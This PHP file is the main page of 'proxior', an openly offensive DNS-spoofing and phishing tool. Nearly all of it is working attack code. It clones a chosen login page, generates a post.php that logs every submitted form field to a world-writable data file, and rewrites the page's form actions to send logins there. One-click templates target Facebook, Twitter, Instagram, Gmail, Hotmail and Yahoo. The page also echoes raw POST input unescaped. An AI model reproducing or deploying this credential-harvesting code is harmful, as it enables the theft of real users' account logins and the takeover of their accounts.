<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


/*
*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
*  proxior is a program for poisoning and spoofing dns.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


  session_start();

  clearstatcache();

  opcache_reset();


   $ip_redirection = shell_exec('shell/./my_ipv4.sh');
  
    require_once('__SRC__/class_redirection.php');

   
   if (class_exists('REDIRECTION_URL_FORCE')) 
    {

    $obj_redirection =  new REDIRECTION_URL_FORCE;    
  

  if ($obj_redirection -> LOCAL_IP[0] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   else if ($obj_redirection -> LOCAL_IP[1] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }



  else if ($obj_redirection -> LOCAL_IP[2] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
    }



   else  if ($obj_redirection -> LOCAL_IP[3] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   
    
   else
    {    

   error_reporting(0);

   error_reporting(E_ERROR | E_WARNING | E_PARSE);

   error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);

   error_reporting(E_ALL & ~E_NOTICE);

   error_reporting(E_ALL);

   error_reporting(-1);

   ini_set('error_reporting', E_ALL);

   ini_set("display_errors", 1);

      }


   }// end of class REDIRECTION_URL_FORCE exists


?>


<html>
<head>

   <title> proxior </title>
  
  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />

 <link rel="stylesheet" type="text/css" href="css/index.css">
 
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />

</head>


<body id="body">



 <script type="text/javascript">
$(document).ready(function(){    
    //Check if the current URL contains '#'
    if(document.URL.indexOf("#")==-1){
        // Set the URL to whatever it was plus "#".
        url = document.URL+"#";
        location = "#";

        //Reload the page
        location.reload(true);
    }
});
</script>




<div class="shell-wrap">

 <p class="shell-top-bar"> 
 <?php
  $output = shell_exec('shell/getaway_ip.sh');
    echo "<a class='a' href='//$output' target='_blank'> Create Fake Dns </a>";      
  ?>       
  </p>
  
 <br>


  <div align="center">
 <form action="" method="post" id="form1">
  <!--  <font color="black"> <h2> Hack http web sites </h2> </font> -->
  
  <font color="white">  < </font>
     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" placeholder="Ip address of attacker"  autofocus required> 
      <font color="white"> > </font>
      <br><br>
      <font color="white"> < </font> 
 <input type="text" name="site_hack" minlength="7" maxlength="256" placeholder="Enter a web site ec: http://www.website.com"  
   id="site" required>  
        <font color="white"> > </font>
      <br> 
     <br>
   <input type="submit" name="hack" value="Hach this site" id="submit"> 
  </form>
    </div>

     <br>

     <div align="center"> 
      <h3> <font color="white"> Or she used a ready </font> </h3>
     </div>


         <br>



      <div align="center">
    <form method="post" action="">
   <select name="site_ready" id="select_site" onchange="this.form.submit()">
    <option selected disabled> Ready websites </option>
     <optgroup label="Social Media">
    <option value ="https://www.facebook.com">  &#120125; &nbsp; Facebook </option>
    <option value ="https://www.twitter.com"> &#120139; &nbsp; Twitter </option>
    <option value ="https://www.instagram.com"> &#120128; &nbsp; Instagram </option>
      </optgroup>

     <option disabled> </option>

       <optgroup label="Email">
    <option value ="https://www.gmail.com"> &#120126; &nbsp; Gmail </option>
    <option value ="https://login.live.com"> &#8461; &nbsp; Hotmail </option>
    <option value ="https://www.yahoo.com"> &#120144; &nbsp; Yahoo </option>
      </optgroup>
  </select>
  </form>


<?php

 require_once('__SRC__/class_attack_details.php');

  if (class_exists('ATTACK_DETAILS')) 
    {
     $OBJ_ATTACK_DETAILS = new ATTACK_DETAILS;

     $CONNECTED      =  $OBJ_ATTACK_DETAILS -> DETAILS[0];
     $PROTOCOL_PORT  =  $OBJ_ATTACK_DETAILS -> DETAILS[1];
     $DNS_CONDITION  =  $OBJ_ATTACK_DETAILS -> DETAILS[2];
     $TIME           =  date($OBJ_ATTACK_DETAILS::CONSTANT);   
  
   ob_flush();

    echo"<table>
	  <thead>

           <tr>
	    <th> Connected </th>
            <th> Protocol & port </th>
	    <th> Dns condition </th>
	    <th> Website </th>
	    <th> Time </th>
          </tr>";


   if(isset($_POST['hack']))
    {
     echo" <tr>
	    <th> $CONNECTED </th>
	    <th> $PROTOCOL_PORT </th>
	    <th> $DNS_CONDITION </th>
	    <th> {$_POST['site_hack']}  </th>
	   <th>  $TIME  </th>
          </tr>

	</thead>
       </table>";
       }
 

   else if (isset($_POST['site_ready']))
         {
          echo" <tr>
	    <th> $CONNECTED </th>
	    <th> $PROTOCOL_PORT </th>
	    <th> $DNS_CONDITION </th>
	    <th> {$_POST['site_ready']}  </th>
	   <th>  $TIME  </th>
          </tr>

	</thead>
       </table>";
           }



ob_end_flush();
flush();
usleep(3000000);



 } // end of class exists



	
?>




    </div>


  
    
<!--
  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="250" width="600">
   </div>
  --> 



</body>



</html>



<?php


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_data = new INPUT_DATA_AVAILABLE;
      



  if(isset($_POST['hack']))
      {
    
  $ip_addr   = $obj_data-> SAFE_DATA_ENTER($_POST['ip_addr']);
  $site_hack = $obj_data-> SAFE_DATA_ENTER($_POST['site_hack']);


   if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
       {

    $get_ip = shell_exec('./my_ipv4.sh');
 
     if ($get_ip = $ip_addr)
       {


      $_SESSION['site_hack']=$site_hack;
 

     $site_name = "index"; 
    //substr(strrchr($site_hack, "/"), 1);

     $url    = $site_hack;
     $name   = $site_name.'.html';
     $file   = file($url);
     $result = file_put_contents($name, $file);





    $post_data_txt = fopen("export/data.txt", "w") or die("Unable to open file!");
    $lines_data_txt = PHP_EOL;
    fwrite($post_data_txt, $lines_data_txt);
    fclose($post_data_txt);

 
     chmod("/var/www/proxior/export/data.txt", 0777);




    $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
    $lines_php = '<?php $file = "export/data.txt";' .PHP_EOL
      .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
      .'?>'
      .PHP_EOL
      .'<html>
      <head>
      </head>
      <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
      </body>
      </html>';

    fwrite($post_file_php, $lines_php);
    fclose($post_file_php);

      #."<meta http-equiv='refresh' content='0; url=$site_hack'/>";

      chmod("/var/www/proxior/post.php", 0777);




      chmod("/var/www/proxior/index.html", 0777);


  $path_to_file = 'index.html';
  $file_contents = file_get_contents($path_to_file);
  $file_contents = str_replace('action="','action="post.php" " ',$file_contents);
  file_put_contents($path_to_file,$file_contents);


 // echo '<script type="text/javascript">alert("The website hack successfully");
  //       </script>';
          echo ("<script>location.href='dns.php'</script>");

          } // end of parity ip


          else if ($get_ip != $ip_addr)
            { 
         echo '<script type="text/javascript">alert("Ipv4 it does not fit");
         </script>';
              }


         }// end of filter validate ip


   else if (filter_var($ip_addr, FILTER_VALIDATE_IP) != true)
     {
echo '<script type="text/javascript">alert("The website hack fail: Try again");
         </script>';
     echo ("<script>location.href='index.php'</script>");
      }   



 } // end of isset







  // isset for ready web sites

 else if(isset($_POST['site_ready']))
   {

    $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);


      $_SESSION['site_ready'] = $site_ready; 
  

      $post_data_txt_site_ready = fopen("export/data.txt", "w");
      chmod("/var/www/proxior/export/data.txt", 0777);


    if ($site_ready=='https://www.facebook.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./facebook.sh');

 

   // echo '<script type="text/javascript">alert("Facebook hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of facebook




     else if ($site_ready=='https://www.twitter.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./twitter.sh');


   // echo '<script type="text/javascript">alert("Twitter hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of twitter




      else if ($site_ready=='https://www.instagram.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./instagram.sh');



   // echo '<script type="text/javascript">alert("Instagram hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of instagram




     else if ($site_ready=='https://www.gmail.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./gmail.sh');



    // echo '<script type="text/javascript">alert("Gmail hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of gmail




      else if ($site_ready=='https://login.live.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./hotmail.sh');



   // echo '<script type="text/javascript">alert("Hotmail hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of hotmail






     if ($site_ready=='https://www.yahoo.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./yahoo.sh');



   // echo '<script type="text/javascript">alert("Yahoo hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of yahoo





    } // end of else if isset for ready web sites


  

  } // end of if exists class tools


?>
